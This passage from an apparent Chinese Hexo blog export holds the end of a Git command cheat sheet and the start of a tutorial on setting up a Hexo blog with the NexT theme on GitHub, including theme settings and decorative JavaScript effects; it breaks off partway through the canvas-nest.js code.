<h1 id="git-push"><a href="#git-push" class="headerlink" title="git push"></a>git push</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 将本地分支推送到远程主机的指定分支</span><br><span class="line">git push &lt;远程主机名&gt; &lt;本地分支名&gt;:&lt;远程分支名&gt;</span><br><span class="line"></span><br><span class="line"># 将本地分支推送到远程主机的对应分支，如果不存在对应分支，则新建</span><br><span class="line">git push &lt;远程主机名&gt; &lt;本地分支名&gt;</span><br><span class="line"></span><br><span class="line"># 将空分支推送到远程分支上，等于删除远程分支（git push origin --delete &lt;远程分支&gt;）</span><br><span class="line">git push &lt;远程主机名&gt; :&lt;远程分支名&gt;</span><br><span class="line"></span><br><span class="line"># 将当前分支推送到远程主机上的对应分支，如果不存在对应分支，不能推送</span><br><span class="line">git push &lt;远程主机名&gt;</span><br><span class="line"></span><br><span class="line"># 假如当前分支只有一个追踪分支，可省略主机名。</span><br><span class="line">git push</span><br><span class="line"></span><br><span class="line">注：如果分支与多个远程主机的分支存在追踪关系，则可以在第一次推送时，通过-u参数指定默认主机，后续可以直接git push，如：git push -u origin master</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 把标签共享到远程仓库</span><br><span class="line">git push origin &lt;标签名&gt;</span><br><span class="line"></span><br><span class="line"># 把所有远程仓库没有的标签共享到远程仓库</span><br><span class="line">git push origin --tags</span><br></pre></td></tr></table></figure>

<h1 id="git-status"><a href="#git-status" class="headerlink" title="git status"></a>git status</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 查看文件状态</span><br><span class="line">git status</span><br></pre></td></tr></table></figure>
<h1 id="git-log"><a href="#git-log" class="headerlink" title="git log"></a>git log</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 查看提交日志</span><br><span class="line">git log</span><br><span class="line"></span><br><span class="line"># 展示成1行；简明的提交id；展示图标</span><br><span class="line">git log --all --pretty=oneline --abbrev-commit --graph</span><br></pre></td></tr></table></figure>

<h1 id="git-reflog"><a href="#git-reflog" class="headerlink" title="git reflog"></a>git reflog</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 查看操作历史，包括提交，回退的操作，属于本地的。</span><br><span class="line">git reflog</span><br><span class="line"></span><br><span class="line"># 清空失效的操作历史</span><br><span class="line">git reflog expire --expire-unreachable=now --all</span><br></pre></td></tr></table></figure>
<h1 id="git-checkout"><a href="#git-checkout" class="headerlink" title="git checkout"></a>git checkout</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 切换到指定分支或标签，检出标签时是不能修改内容的</span><br><span class="line">git checkout &lt;分支名&gt;或&lt;标签名&gt;</span><br><span class="line"></span><br><span class="line"># 检出远程指定分支，指定分支名并切换到该分支</span><br><span class="line">git checkout -b &lt;新建分支名&gt; origin/&lt;远程分支名&gt;</span><br><span class="line"></span><br><span class="line"># 检出指定tag到指定分支，并切换到该分支</span><br><span class="line">git checkout -b &lt;新建分支名&gt; &lt;标签名&gt;</span><br></pre></td></tr></table></figure>

<h1 id="git-branch"><a href="#git-branch" class="headerlink" title="git branch"></a>git branch</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 手动建立本地分支与远程分支的追踪关系（tracking）</span><br><span class="line">git branch --set-upstream-to=origin/&lt;远程分支名&gt; &lt;本地分支名&gt;</span><br><span class="line">git branch --set-upstream &lt;本地分支名&gt; origin/&lt;远程分支名&gt;</span><br><span class="line"></span><br><span class="line"># 查看分支，-a所有分支，-r远程分支，--merged已合并到当前分支的分支，--no-merged没合并到当前分支的分支，-v查看各个分支最后一次提交信息</span><br><span class="line">git branch </span><br><span class="line"></span><br><span class="line"># 创建分支</span><br><span class="line">git branch &lt;分支名&gt;</span><br><span class="line"></span><br><span class="line"># 同步分支到远程</span><br><span class="line">git branch origin &lt;分支名&gt;</span><br><span class="line"></span><br><span class="line"># 重命名分支</span><br><span class="line">git branch -m &lt;旧分支名&gt; &lt;新分支名&gt; </span><br><span class="line"></span><br><span class="line"># 删除分支，-D无论是否已经合并都可以删除</span><br><span class="line">git branch -d &lt;分支名&gt;</span><br></pre></td></tr></table></figure>

<h1 id="git-tag"><a href="#git-tag" class="headerlink" title="git tag"></a>git tag</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 列出所有标签</span><br><span class="line">git tag</span><br><span class="line"></span><br><span class="line"># 创建标签，并存储信息</span><br><span class="line">git tag -a &lt;标签名&gt; -m &lt;标签信息&gt;</span><br><span class="line"></span><br><span class="line"># 创建标签</span><br><span class="line">git tag &lt;标签名&gt;</span><br></pre></td></tr></table></figure>

<h1 id="git-remote"><a href="#git-remote" class="headerlink" title="git remote"></a>git remote</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 列出所有远程主机，-v可查看远程主机地址</span><br><span class="line">git remote [-v]</span><br><span class="line"></span><br><span class="line"># 查看远程主机详细信息</span><br><span class="line">git remote show &lt;主机名&gt;</span><br><span class="line"></span><br><span class="line"># 添加远程主机</span><br><span class="line">git remote add &lt;主机名&gt; &lt;地址&gt;</span><br><span class="line"></span><br><span class="line"># 删除远程主机</span><br><span class="line">git remote rm &lt;主机名&gt;</span><br><span class="line"></span><br><span class="line"># 远程主机重命名</span><br><span class="line">git remote rename &lt;原主机名&gt; &lt;新主机名&gt;</span><br></pre></td></tr></table></figure>

<h1 id="git-merge"><a href="#git-merge" class="headerlink" title="git merge"></a>git merge</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 将指定分支合并到当前分支</span><br><span class="line">git merge &lt;分支名&gt;</span><br></pre></td></tr></table></figure>

<h1 id="git-fetch"><a href="#git-fetch" class="headerlink" title="git fetch"></a>git fetch</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 将某个远程主机的更新，全部取回本地，远程主机名在git clone时，被默认命名为origin</span><br><span class="line">git fetch &lt;远程主机名&gt;</span><br><span class="line"></span><br><span class="line"># 取回特定分支的更新</span><br><span class="line">git fetch &lt;远程主机名&gt; &lt;分支名&gt;</span><br><span class="line"></span><br><span class="line"># 把远程分支取回到本地分支</span><br><span class="line">git fetch origin &lt;远程分支&gt;:&lt;本地分支&gt;</span><br></pre></td></tr></table></figure>

<h1 id="git-rebase"><a href="#git-rebase" class="headerlink" title="git rebase"></a>git rebase</h1><ol>
<li>用法1：变基</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">使用场景：假设当前最新的提交为E，突然经理让你去开发一个topic功能，于是你切了topic分支在上面进行开发，其他同事仍然在各自的分支</span><br><span class="line">		开发各自的功能，他们的开发完并合并到主分支后，这个时候你终于开发完了，合并到主分支前，发现主分支HEAD已经指向G，这个情</span><br><span class="line">		况，就可以使用变基来更新到主分支最新的代码。</span><br><span class="line"></span><br><span class="line">变基前：</span><br><span class="line">          A---B---C topic</span><br><span class="line">         /</span><br><span class="line">    D---E---F---G master</span><br><span class="line"></span><br><span class="line">变基后（A&#x27;,B&#x27;,C&#x27;为解决冲突后你的提交）：</span><br><span class="line">                  A&#x27;--B&#x27;--C&#x27; topic</span><br><span class="line">                 /</span><br><span class="line">    D---E---F---G master</span><br><span class="line">		</span><br><span class="line"># 在topic分支上执行：</span><br><span class="line">git rebase master		# 变基</span><br><span class="line"></span><br><span class="line"># 如果出现冲突，先解决完冲突，再git add</span><br><span class="line">git add &lt;conflicted_files&gt;</span><br><span class="line"></span><br><span class="line"># 然后继续变基（或者取消变基git rebase --abort）：</span><br><span class="line">git rebase --continue</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>用法2：修改（合并）提交信息</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">当前有如下提交，准备把B、C、D这3个提交合并成1个：</span><br><span class="line">$ git log --pretty=oneline --abbrev-commit</span><br><span class="line">13ce96a (HEAD -&gt; master) D</span><br><span class="line">40ad5be C</span><br><span class="line">32ba939 B</span><br><span class="line">200d4c4 1-A</span><br></pre></td></tr></table></figure>

<ul>
<li>执行：<code>git rebase -i 200d4c4</code>（这个commitId是要合并的前一个的提交） ，出现如下交互界面（按i进入插入模式），除了第1行B前面那个pick不要改，C、D前的pick改为s，按esc，再按:wq，保存退出。</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pick 32ba939 B</span><br><span class="line">pick 40ad5be C</span><br><span class="line">pick 13ce96a D</span><br><span class="line"></span><br><span class="line"># Rebase 200d4c4..13ce96a onto 200d4c4 (3 commands)</span><br><span class="line">#</span><br><span class="line"># Commands:</span><br><span class="line"># p, pick &lt;commit&gt; = use commit</span><br><span class="line"># r, reword &lt;commit&gt; = use commit, but edit the commit message</span><br><span class="line"># e, edit &lt;commit&gt; = use commit, but stop for amending</span><br><span class="line"># s, squash &lt;commit&gt; = use commit, but meld into previous commit</span><br><span class="line"># f, fixup [-C | -c] &lt;commit&gt; = like &quot;squash&quot; but keep only the previous</span><br><span class="line">#                    commit&#x27;s log message, unless -C is used, in which case</span><br><span class="line">#                    keep only this commit&#x27;s message; -c is same as -C but</span><br><span class="line">#                    opens the editor</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>再次自动进入交互界面，提示修改提交信息，#开头的为注释，进入插入模式，修改保存退出，提示：Successfully rebased，则合并完成。</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># This is a combination of 3 commits.</span><br><span class="line"># This is the 1st commit message:</span><br><span class="line"></span><br><span class="line">B</span><br><span class="line"></span><br><span class="line"># This is the commit message #2:</span><br><span class="line"></span><br><span class="line">C</span><br><span class="line"></span><br><span class="line"># This is the commit message #3:</span><br><span class="line"></span><br><span class="line">D</span><br><span class="line"></span><br><span class="line"># Please enter the commit message for your changes. Lines starting</span><br><span class="line"># with &#x27;#&#x27; will be ignored, and an empty message aborts the commit.</span><br></pre></td></tr></table></figure>

<ul>
<li>查看log，合并完成，最后<code>git push -f</code>推送到远程仓库（如果合并的是已经push的提交）</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ git log --pretty=oneline --abbrev-commit</span><br><span class="line">8a758fb (HEAD -&gt; master) BCD</span><br><span class="line">200d4c4 1-A</span><br></pre></td></tr></table></figure>

<h1 id="git-diff"><a href="#git-diff" class="headerlink" title="git diff"></a>git diff</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 查看文件改动状态</span><br><span class="line">git diff &lt;file&gt;</span><br></pre></td></tr></table></figure>

<h1 id="帮助命令"><a href="#帮助命令" class="headerlink" title="帮助命令"></a>帮助命令</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># -h：本地命令用法；--help：在线文档</span><br><span class="line">git &lt;命令&gt; -h</span><br><span class="line"></span><br><span class="line">例如：git config -h；git push -h等。</span><br></pre></td></tr></table></figure>

<h1 id="撤销相关"><a href="#撤销相关" class="headerlink" title="撤销相关"></a>撤销相关</h1><p>补充：HEAD最新提交节点，HEAD<del>N是HEAD的上N次的版本。这里 [What’s the difference between HEAD^ and HEAD</del> in Git? - Stack Overflow](<a href="https://stackoverflow.com/questions/2221658/whats-the-difference-between-head-and-head-in-git">https://stackoverflow.com/questions/2221658/whats-the-difference-between-head-and-head-in-git</a>) 描述了与<code>HEAD^</code>之间的区别，需要在合并节点上才有讨论意义：</p>
<p>HEAD~N：表示在第1个父节点上位移N步，N等于1时可省略；</p>
<p>HEAD^N：表示在第N个父节点上位移1步，N等于1时可省略；</p>
<p>则：HEAD~~ &#x3D; HEAD<del>2，HEAD^^ &#x3D; HEAD</del>2，HEAD^^2表示：在第1个父节点位移1步，再在位移后的第二个父节点位移1步。通常都只是位移1步，用哪个都一样，N值较大时，建议使用commitId，N等于0时，就是HEAD本身。</p>
<p><img src="/../img/202204210823698.png" alt="image-20220421082352591"></p>
<h2 id="git-restore"><a href="#git-restore" class="headerlink" title="git restore"></a>git restore</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 工作区或暂存区的文件恢复到指定提交节点的状态</span><br><span class="line">git restore [&lt;options&gt;] [--source=&lt;branch&gt;] &lt;file&gt;...</span><br><span class="line">常用选项：</span><br><span class="line">    -s, --source		  可以是类似HEAD~N，也可以是指定commitId（默认HEAD，即单纯撤销工作区的修改）</span><br><span class="line">    -S, --staged          恢复的是暂存区</span><br><span class="line">    -W, --worktree        恢复的是工作区（默认）</span><br><span class="line">    </span><br><span class="line">&lt;file&gt;可以用符号.代替当前目录及子目录下所有被修改的文件，Untracked文件不会被删除，会删除不存在指定提交的跟踪文件，但可通过恢复当前提交找回。</span><br><span class="line"></span><br><span class="line">git checkout HEAD . &lt;==等效==&gt; git restore .</span><br><span class="line">git checkout &lt;branch&gt; &lt;file&gt; 不会删除不存在指定提交的跟踪文件</span><br></pre></td></tr></table></figure>

<h2 id="git-clean"><a href="#git-clean" class="headerlink" title="git clean"></a>git clean</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 删除未跟踪文件，-f强制，-d整个目录下的</span><br><span class="line">git clean -fd</span><br></pre></td></tr></table></figure>

<h2 id="git-reset"><a href="#git-reset" class="headerlink" title="git reset"></a>git reset</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 回退到指定的版本（选择性的保留当前版本的哪个区域）</span><br><span class="line">git reset [--mixed | --soft | --hard | --merge | --keep] [-q] [&lt;commit&gt;]</span><br><span class="line">常用选项：</span><br><span class="line">    --mixed               reset HEAD and index（回退本地仓库和暂存区，工作区保持不变）</span><br><span class="line">    --soft                reset only HEAD（仅回退本地仓库，暂存区、工作区保持不变）</span><br><span class="line">    --hard                reset HEAD, index and working tree（回退本地仓库、暂存区、工作区）</span><br><span class="line"></span><br><span class="line"># 因为HEAD是最新一次提交，所以相当于暂存区文件撤销，不指定文件，则撤销所有暂存区的文件（工作区&lt;==暂存区）</span><br><span class="line">git reset HEAD [file]</span><br></pre></td></tr></table></figure>

<p>Git工作状态图：</p>
<p><img src="/../img/git_status.png"></p>
]]></content>
      <categories>
        <category>Git</category>
      </categories>
      <tags>
        <tag>Git</tag>
      </tags>
  </entry>
  <entry>
    <title>Hexo+NexT主题+GitHub搭建博客</title>
    <url>/2021/09/10/Hexo+NexT%E4%B8%BB%E9%A2%98+GitHub%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2/</url>
    <content><![CDATA[<h1 id="1-安装hexo"><a href="#1-安装hexo" class="headerlink" title="1. 安装hexo"></a>1. 安装hexo</h1><ol>
<li>安装hexo-cli</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">npm install hexo-cli -g</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>配置nodejs的全局路径到系统path</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">D:\InstallPath\work_portable\node-v16.14.2-win-x64\node_global</span><br></pre></td></tr></table></figure>

<ol start="3">
<li>初始化博客</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hexo init blog</span><br><span class="line"></span><br><span class="line">cd blog</span><br><span class="line"></span><br><span class="line">npm install</span><br></pre></td></tr></table></figure>

<ol start="4">
<li>相关指令</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 创建aaa.md，简写hexo n</span><br><span class="line">hexo new aaa</span><br><span class="line"></span><br><span class="line"># 开启服务，简写hexo s</span><br><span class="line">hexo server</span><br><span class="line"></span><br><span class="line"># 生成文档，简写hexo g</span><br><span class="line">hexo generate</span><br><span class="line"></span><br><span class="line"># 发布，简写hexo d</span><br><span class="line">hexo deploy</span><br><span class="line"></span><br><span class="line"># 清除</span><br><span class="line">hexo clean</span><br><span class="line"></span><br><span class="line"># 先清除旧html文档，再生成新文档，最后开启服务</span><br><span class="line">hexo clean &amp;&amp; hexo g &amp;&amp; hexo s</span><br><span class="line"></span><br><span class="line"># 创建标签页</span><br><span class="line">hexo n page tags</span><br></pre></td></tr></table></figure>

<h1 id="2-配置nexT主题"><a href="#2-配置nexT主题" class="headerlink" title="2. 配置nexT主题"></a>2. 配置nexT主题</h1><ol>
<li>切换到hexo根目录拉取nexT插件，版本：NexT version 8.11.0</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/next-theme/hexo-theme-next themes/next</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>修改hexo的配置</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">theme: next</span><br></pre></td></tr></table></figure>

<ol start="3">
<li>创建标签页</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 创建标签页</span><br><span class="line">hexo n page tags</span><br><span class="line"></span><br><span class="line"># 修改source\tags\index.md，增加</span><br><span class="line">type: &quot;tags&quot;</span><br></pre></td></tr></table></figure>

<ol start="4">
<li>创建分类页</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 创建标签页</span><br><span class="line">hexo n page categories</span><br><span class="line"></span><br><span class="line"># 修改source\categories\index.md，增加</span><br><span class="line">type: &quot;categories&quot;</span><br></pre></td></tr></table></figure>

<ol start="5">
<li>修改scaffolds&#x2F;post.md（hexo n xxx的模板）</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">---</span><br><span class="line">title: &#123;&#123; title &#125;&#125;</span><br><span class="line">date: &#123;&#123; date &#125;&#125;</span><br><span class="line">tags:</span><br><span class="line">categories:</span><br><span class="line">description:</span><br><span class="line">---</span><br></pre></td></tr></table></figure>

<ol start="6">
<li>拉取nexT的hexo-next-three主题（3D主题）</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">npm install next-theme/hexo-next-three</span><br><span class="line"></span><br><span class="line">修改nexT配置：</span><br><span class="line">three:</span><br><span class="line">  enable: true</span><br><span class="line">  defer: true</span><br><span class="line">  cdn:</span><br><span class="line">  waves:</span><br><span class="line">    enable: false</span><br><span class="line">    cdn:</span><br><span class="line">  lines:</span><br><span class="line">    enable: false</span><br><span class="line">    cdn:</span><br><span class="line">  sphere:</span><br><span class="line">    enable: false</span><br><span class="line">    cdn:</span><br></pre></td></tr></table></figure>

<ol start="7">
<li>安装search插件</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">npm install hexo-generator-searchdb --save</span><br><span class="line"></span><br><span class="line">修改nexT配置：</span><br><span class="line"># Local Search</span><br><span class="line"># Dependencies: https://github.com/next-theme/hexo-generator-searchdb</span><br><span class="line">local_search:</span><br><span class="line">  enable: true</span><br><span class="line">  # If auto, trigger search by changing input.</span><br><span class="line">  # If manual, trigger search by pressing enter key or search button.</span><br><span class="line">  trigger: auto</span><br><span class="line">  # Show top n results per article, show all results by setting to -1</span><br><span class="line">  top_n_per_article: 1</span><br><span class="line">  # Unescape html strings to the readable one.</span><br><span class="line">  unescape: false</span><br><span class="line">  # Preload the search data when the page loads.</span><br><span class="line">  preload: false</span><br><span class="line"></span><br><span class="line">增加hexo配置：</span><br><span class="line"># search功能</span><br><span class="line">search:</span><br><span class="line">  path: search.xml</span><br><span class="line">  field: post</span><br><span class="line">  content: true</span><br><span class="line">  format: html</span><br></pre></td></tr></table></figure>

<ol start="8">
<li>增加”总访客量”、”总访问量”字样，将<code>themes\next\layout\_third-party\statistics\busuanzi-counter.njk</code>修改成以下配置</li>
</ol>
<p>或者直接修改<code>themes\next\layout\_partials\footer.njk</code>，增加两个span</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;%- if theme.busuanzi_count.enable %&#125;</span><br><span class="line">  &lt;script&#123;&#123; pjax &#125;&#125; async src=&quot;https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js&quot;&gt;&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">  &lt;script&gt;</span><br><span class="line">    var siteUv = document.getElementById(&quot;busuanzi_value_site_uv&quot;);</span><br><span class="line">    var beforeSiteUv = document.createElement(&quot;span&quot;);</span><br><span class="line">    beforeSiteUv.innerHTML = &quot;总访客量 &quot;;</span><br><span class="line">    siteUv.parentNode.insertBefore(beforeSiteUv, siteUv);</span><br><span class="line"></span><br><span class="line">    var sitePv = document.getElementById(&quot;busuanzi_value_site_pv&quot;);</span><br><span class="line">    var beforeSitePv = document.createElement(&quot;span&quot;);</span><br><span class="line">    beforeSitePv.innerHTML = &quot;总访问量 &quot;;</span><br><span class="line">    sitePv.parentNode.insertBefore(beforeSitePv, sitePv);</span><br><span class="line">  &lt;/script&gt;</span><br><span class="line">&#123;%- endif %&#125;</span><br></pre></td></tr></table></figure>

<ol start="9">
<li>去除底部的”强力”字样，在<code>themes\next\source\css\_common\outline\footer\index.styl</code>顶部增加如下样式，或者直接修改<code>themes\next\layout\_partials\footer.njk</code>，注释对应的代码</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.footer .powered-by &#123;</span><br><span class="line">  display: none;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>或直接修改next的配置，增加</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">footer:</span><br><span class="line">  powered: false</span><br></pre></td></tr></table></figure>

<ol start="10">
<li>增加点击特效（爱心特效）</li>
</ol>
<p>i. 创建<code>themes\next\source\js\my_js\click_love.js</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/*网页鼠标点击特效（爱心）*/</span><br><span class="line">!function (e, t, a) &#123;function r() &#123;for (var e = 0; e &lt; s.length; e++) s[e].alpha &lt;= 0 ? (t.body.removeChild(s[e].el), s.splice(e, 1)) : (s[e].y--, s[e].scale += .004, s[e].alpha -= .013, s[e].el.style.cssText = &quot;left:&quot; + s[e].x + &quot;px;top:&quot; + s[e].y + &quot;px;opacity:&quot; + s[e].alpha + &quot;;transform:scale(&quot; + s[e].scale + &quot;,&quot; + s[e].scale + &quot;) rotate(45deg);background:&quot; + s[e].color + &quot;;z-index:99999&quot;);requestAnimationFrame(r)&#125;function n() &#123;var t = &quot;function&quot; == typeof e.onclick &amp;&amp; e.onclick;e.onclick = function (e) &#123;t &amp;&amp; t(), o(e)&#125;&#125;function o(e) &#123;var a = t.createElement(&quot;div&quot;);a.className = &quot;heart&quot;, s.push(&#123;el: a,x: e.clientX - 5,y: e.clientY - 5,scale: 1,alpha: 1,color: c()&#125;), t.body.appendChild(a)&#125;function i(e) &#123;var a = t.createElement(&quot;style&quot;);a.type = &quot;text/css&quot;;try &#123;a.appendChild(t.createTextNode(e))&#125; catch (t) &#123;a.styleSheet.cssText = e&#125;t.getElementsByTagName(&quot;head&quot;)[0].appendChild(a)&#125;function c() &#123;return &quot;rgb(&quot; + ~~(255 * Math.random()) + &quot;,&quot; + ~~(255 * Math.random()) + &quot;,&quot; + ~~(255 * Math.random()) + &quot;)&quot;&#125;var s = [];e.requestAnimationFrame = e.requestAnimationFrame || e.webkitRequestAnimationFrame || e.mozRequestAnimationFrame || e.oRequestAnimationFrame || e.msRequestAnimationFrame || function (e) &#123;setTimeout(e, 1e3 / 60)&#125;, i(&quot;.heart&#123;width: 10px;height: 10px;position: fixed;background: #f00;transform: rotate(45deg);-webkit-transform: rotate(45deg);-moz-transform: rotate(45deg);&#125;.heart:after,.heart:before&#123;content: &#x27;&#x27;;width: inherit;height: inherit;background: inherit;border-radius: 50%;-webkit-border-radius: 50%;-moz-border-radius: 50%;position: fixed;&#125;.heart:after&#123;top: -5px;&#125;.heart:before&#123;left: -5px;&#125;&quot;), n(), r()&#125;(window, document);</span><br></pre></td></tr></table></figure>

<p>​		ii. 修改<code>themes\next\layout\ _layout.njk</code>，在head标签中添加</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script type=&quot;text/javascript&quot; src=&quot;/js/my_js/click_love.js&quot;&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<ol start="11">
<li>配置背景canvas wave特效，新增<code>source/_data/footer.swig</code>，内容如下：</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script color=&quot;0,0,255&quot; opacity=&quot;0.5&quot; zIndex=&quot;-1&quot; count=&quot;99&quot; src=&quot;/js/my_js/canvas-nest.js&quot;&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>​	新增<code>themes\next\source\js\my_js\canvas-nest.js</code>，内容如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/**</span><br><span class="line"> * Copyright (c) 2016 hustcc</span><br><span class="line"> * License: MIT</span><br><span class="line"> * Version: v1.0.1</span><br><span class="line"> * GitHub: https://github.com/hustcc/canvas-nest.js</span><br><span class="line">**/</span><br><span class="line">! function() &#123;</span><br><span class="line">  //封装方法，压缩之后减少文件大小</span><br><span class="line">  function get_attribute(node, attr, default_value) &#123;</span><br><span class="line">    return node.getAttribute(attr) || default_value;</span><br><span class="line">  &#125;</span><br><span class="line">  //封装方法，压缩之后减少文件大小</span><br><span class="line">  function get_by_tagname(name) &#123;</span><br><span class="line">    return document.getElementsByTagName(name);</span><br><span class="line">  &#125;</span><br><span class="line">  //获取配置参数</span><br><span class="line">  function get_config_option() &#123;</span><br><span class="line">    var scripts = get_by_tagname(&quot;script&quot;),</span><br><span class="line">      script_len = scripts.length,</span><br><span class="line">      script = scripts[script_len - 1]; //当前加载的script</span><br><span class="line">    return &#123;</span><br><span class="line">      l: script_len, //长度，用于生成id用</span><br><span class="line">      z: get_attribute(script, &quot;zIndex&quot;, -1), //z-index</span><br><span class="line">      o: get_attribute(script, &quot;opacity&quot;, 0.5), //opacity</span><br><span class="line">      c: get_attribute(script, &quot;color&quot;, &quot;0,0,0&quot;), //color</span><br><span class="line">      n: get_attribute(script, &quot;count&quot;, 99) //count</span><br><span class="line">    &#125;;</span><br><span class="line">  &#125;</span><br><span class="line">  //设置canvas的高宽</span><br><span class="line">  function set_canvas_size() &#123;</span><br><span class="line">    canvas_width = the_canvas.width = window.innerWidth || document.documentElement.clientWidth || document.body.clientWidth, </span><br><span class="line">    canvas_height = the_canvas.height = window.innerHeight || document.documentElement.clientHeight || document.body.clientHeight;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  //绘制过程</span><br><span class="line">  function draw_canvas() &#123;</span><br><span class="line">    context.clearRect(0, 0, canvas_width, canvas_height);</span><br><span class="line">    //随机的线条和当前位置联合数组</span><br><span class="line">    var e, i, d, x_dist, y_dist, dist; //临时节点</span><br><span class="line">    //遍历处理每一个点</span><br><span class="line">    random_points.forEach(function(r, idx) &#123;</span><br><span class="line">      r.x += r.xa, </span><br><span class="line">      r.y += r.ya, //移动</span><br><span class="line">      r.xa *= r.x &gt; canvas_width || r.x &lt; 0 ? -1 : 1, </span><br><span class="line">      r.ya *= r.y &gt; canvas_height || r.y &lt; 0 ? -1 : 1, //碰到边界，反向反弹</span><br><span class="line">      context.fillRect(r.x - 0.5, r.y - 0.5, 1, 1); //绘制一个宽高为1的点</span><br><span class="line">      //从下一个点开始</span><br><span class="line">      for (i = idx + 1; i &lt; all_array.length; i++) &#123;</span><br><span class="line">        e = all_array[i];</span><br><span class="line">        // 当前点存在</span><br><span class="line">        if (null !== e.x &amp;&amp; null !== e.y) &#123;</span><br><span class="line">          x_dist = r.x - e.x; //x轴距离 l</span><br><span class="line">          y_dist = r.y - e.y; //y轴距离 n</span><br><span class="line">          dist = x_dist * x_dist + y_dist * y_dist; //总距离, m</span><br><span class="line"></span><br><span class="line">          dist &lt; e.max &amp;&amp; (e === current_point &amp;&amp; dist &gt;= e.max / 2 &amp;&amp; (r.x -= 0.03 * x_dist, r.y -= 0.03 * y_dist), //靠近的时候加速</span><br><span class="line">            d = (e.max - dist) / e.max,</span><br><span class="line">            context.beginPath(),</span><br><span class="line">            context.lineWidth = d / 2,</span><br><span class="line">            context.strokeStyle = &quot;rgba(&quot; + config.c + &quot;,&quot; + (d + 0.2) + &quot;)&quot;,</span><br><span class="line">            context.moveTo(r.x, r.y),</span><br><span class="line">            context.lineTo(e.x, e.y),</span><br><span class="line">            context.stroke());</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;), frame_func(draw_canvas);</span><br><span class="line">  &#125;</span><br><span class="line">  //创建画布，并添加到body中</span><br><span class="line">  var the_canvas = document.createElement(&quot;canvas&quot;), //画布</span><br><span class="line">    config = get_config_option(), //配置</span><br><span class="line">    canvas_id = &quot;c_n&quot; + config.l, //canvas id</span><br><span class="line">    context = the_canvas.getContext(&quot;2d&quot;), canvas_width, canvas_height, </span><br><span class="line">    frame_func = window.requestAnimationFrame || window.webkitRequestAnimationFrame || window.mozRequestAnimationFrame || window.oRequestAnimationFrame || window.msRequestAnimationFrame || function(func) &#123;</span><br><span class="line">      window.setTimeout(func, 1000 / 45);</span><br><span class="line">    &#125;, random = Math.random, </span><br><span class="line">    current_point = &#123;</span><br><span class="line">      x: null, //当前鼠标x</span><br><span class="line">      y: null, //当前鼠标y</span><br><span class="line">      max: 20000 // 圈半径的平方</span><br><span class="line">    &#125;,</span><br><span class="line">    all_array;</span><br><span class="line">  the_canvas.id = canvas_id;</span><br><span class="line">  the_canvas.style.cssText = &quot;position:fixed;top:0;left:0;z-index:&quot; + config.z + &quot;;opacity:&quot; + config.o;</span><br><span class="line">  get_by_tagname(&quot;body&quot;)[0].appendChild(the_canvas);</span><br><span class="line"></span><br><span class="line">  //初始化画布大小</span><br><span class="line">  set_canvas_size();</span><br><span class="line">  window.onresize = set_canvas_size;</span><br><span class="line">  //当时鼠标位置存储，离开的时候，释放当前位置信息</span><br><span class="line">  window.onmousemove = function(e) &#123;</span><br><span class="line">    e = e || window.event;</span><br><span class="line">    